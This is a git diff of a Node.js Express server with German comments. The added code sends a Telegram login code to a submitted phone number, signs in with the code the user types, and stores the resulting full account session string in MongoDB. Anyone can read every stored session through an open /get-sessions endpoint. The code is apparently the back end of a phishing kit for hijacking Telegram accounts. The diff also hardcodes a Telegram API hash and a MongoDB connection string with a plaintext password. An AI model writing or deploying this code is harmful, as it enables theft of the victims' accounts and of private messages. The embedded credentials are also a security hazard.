@@ -1,5 +1,6 @@
 const express = require('express');
 const cors = require('cors');
+const mongoose = require('mongoose');
 const { TelegramClient, Api } = require('telegram');
 const { StringSession } = require('telegram/sessions');
 
@@ -7,50 +8,63 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-const apiId = 23049703;
-const apiHash = "e9c00af578a9de0253ef02337460498f";
-const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
-    connectionRetries: 5,
+// CONFIG
+const apiId = 23049703; // Deine ID
+const apiHash = 'e9c00af578a9de0253ef02337460498f'; // Dein Hash
+const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0";
+
+mongoose.connect(MONGO_URI)
+    .then(() => console.log("DB Connected"))
+    .catch(err => console.error("DB Error:", err));
+
+const SessionSchema = new mongoose.Schema({
+    phoneNumber: String,
+    sessionString: String,
+    date: { type: Date, default: Date.now }
 });
+const SessionModel = mongoose.model('Session', SessionSchema);
 
-(async () => {
-    await client.connect();
-    console.log("Backend gestartet.");
-})();
-
+// Endpoint 1: OTP senden
 app.post('/send-otp', async (req, res) => {
-    const { phoneNumber } = req.body;
     try {
-        // Direkter Aufruf der API zur Code-Anforderung
-        const result = await client.invoke(new Api.auth.SendCode({
-            phoneNumber: phoneNumber.trim(),
-            apiId: apiId,
-            apiHash: apiHash,
-            settings: new Api.CodeSettings({}),
-        }));
+        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
+        await client.connect();
+        const result = await client.sendCode({ apiId, apiHash }, req.body.phoneNumber);
         res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
     } catch (err) {
-        console.error("Fehler send-otp:", err);
-        res.json({ success: false, error: err.message });
+        res.status(500).json({ success: false, error: err.message });
     }
 });
 
+// Endpoint 2: OTP verifizieren & Session speichern
 app.post('/verify-otp', async (req, res) => {
-    const { phoneNumber, phoneCode, phoneCodeHash } = req.body;
     try {
-        // Direkter Aufruf der API zur Anmeldung
-        await client.invoke(new Api.auth.SignIn({
-            phoneNumber: phoneNumber.trim(),
-            phoneCodeHash: phoneCodeHash,
-            phoneCode: phoneCode.trim()
-        }));
+        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
+        await client.connect();
+        await client.signIn({
+            phoneNumber: req.body.phoneNumber,
+            phoneCodeHash: req.body.phoneCodeHash,
+            phoneCode: req.body.phoneCode
+        });
         
-        console.log("Login erfolgreich!");
+        const sessionString = client.session.save();
+        await SessionModel.create({ phoneNumber: req.body.phoneNumber, sessionString });
+        
         res.json({ success: true });
     } catch (err) {
-        console.error("Fehler verify-otp:", err);
-        res.json({ success: false, error: err.message });
+        res.status(500).json({ success: false, error: err.message });
     }
 });
 
-app.listen(3000, () => console.log('Server läuft auf Port 3000'));
+// Endpoint 3: Alle Sessions abrufen
+app.get('/get-sessions', async (req, res) => {
+    try {
+        const sessions = await SessionModel.find();
+        res.json(sessions);
+    } catch (err) {
+        res.status(500).json({ error: "DB Error" });
+    }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
